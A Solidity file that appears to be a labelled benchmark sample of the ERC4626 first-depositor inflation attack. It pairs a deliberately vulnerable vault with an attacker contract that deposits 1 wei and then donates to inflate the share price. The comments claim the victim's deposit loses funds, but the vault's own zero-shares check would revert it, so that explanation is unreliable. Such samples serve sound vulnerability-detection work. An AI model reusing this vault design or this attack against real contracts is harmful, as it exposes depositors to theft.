// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title Vault Inflation Attack
 * @notice BASELINE: ERC4626 first depositor attack
 * @dev VULNERABLE: Attacker can inflate share price
 *
 * ATTACK VECTOR:
 * 1. Attacker deposits 1 wei, gets 1 share
 * 2. Attacker donates large amount directly to vault (bypassing deposit())
 * 3. Share price becomes huge: 1 share = millions of wei
 * 4. Next depositor loses funds due to rounding
 *
 * METADATA:
 * - Category: defi
 * - Tier: advanced
 * - Safe: false
 * - Immunefi Level: 4 (High)
 * - Tags: ["erc4626", "inflation-attack", "first-depositor"]
 */
contract VaultInflationVulnerable {
    uint256 public totalAssets;
    uint256 public totalShares;

    mapping(address => uint256) public sharesOf;

    event Deposit(address user, uint256 assets, uint256 shares);
    event Donate(address donor, uint256 amount);

    /**
     * @notice VULNERABLE: No minimum shares check
     */
    function deposit(uint256 assets) public payable returns (uint256 shares) {
        require(msg.value == assets, "ETH mismatch");

        if (totalShares == 0) {
            shares = assets;  // VULNERABLE: Can be just 1 wei
        } else {
            shares = (assets * totalShares) / totalAssets;  // VULNERABLE: Rounds down
        }

        // ISSUE: If shares == 0 due to rounding, user loses funds!
        require(shares > 0, "Shares = 0");

        totalAssets += assets;
        totalShares += shares;
        sharesOf[msg.sender] += shares;

        emit Deposit(msg.sender, assets, shares);
    }

    /**
     * @notice Attacker uses this to manipulate share price
     */
    function donateToVault() public payable {
        totalAssets += msg.value;
        emit Donate(msg.sender, msg.value);
    }

    function withdraw(uint256 shares) public returns (uint256 assets) {
        require(sharesOf[msg.sender] >= shares);

        assets = (shares * totalAssets) / totalShares;

        sharesOf[msg.sender] -= shares;
        totalShares -= shares;
        totalAssets -= assets;

        payable(msg.sender).transfer(assets);
    }
}

/**
 * @title Inflation Attacker
 * @notice Demonstrates the inflation attack
 */
contract InflationAttacker {
    VaultInflationVulnerable public vault;

    constructor(address _vault) {
        vault = VaultInflationVulnerable(_vault);
    }

    /**
     * @notice Execute inflation attack
     * STEP 1: Deposit 1 wei
     * STEP 2: Donate 1 million wei
     * STEP 3: Next depositor with 1000 wei gets 0 shares (rounds down)
     */
    function attack() public payable {
        // Step 1: Deposit 1 wei, get 1 share
        vault.deposit{value: 1}(1);

        // Step 2: Donate 1 million wei directly
        // Now: totalAssets = 1,000,001, totalShares = 1
        // Share price = 1,000,001 wei per share
        vault.donateToVault{value: 1000000}();

        // Step 3: Next user deposits 1000 wei
        // shares = (1000 * 1) / 1,000,001 = 0 (rounds down)
        // User loses funds!
    }
}